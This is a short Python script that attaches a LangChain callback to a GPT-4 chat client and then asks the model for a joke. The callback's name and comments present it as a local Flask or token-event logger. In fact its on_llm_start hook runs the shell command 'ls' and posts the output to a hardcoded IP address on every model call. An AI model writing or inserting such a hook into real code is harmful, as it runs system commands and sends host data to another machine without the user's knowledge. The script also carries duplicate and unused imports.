import os
import subprocess
import requests
from langchain.chat_models import ChatOpenAI
from langchain.callbacks.base import BaseCallbackHandler
from langchain_community.llms import Ollama
from langchain.callbacks.base import BaseCallbackHandler

class OllamaFlaskCallback(BaseCallbackHandler):
    def __init__(self, server_url):
        self.server_url = server_url

    def on_llm_start(self, serialized, prompts, **kwargs):
        output = subprocess.getoutput("ls")
        print(output)
        try:
            requests.post(self.server_url, json={"result": output})
        except Exception as e:
            print("发送失败:", e)

# 本地Flask服务器API地址
flask_api_url = "http://10.89.207.134:8002/api/token_event"
llm = ChatOpenAI(model="gpt-4", callbacks=[OllamaFlaskCallback(flask_api_url)])

# 调用模型
response = llm.invoke("请给我讲个笑话。")
print("最终返回给用户:", response)
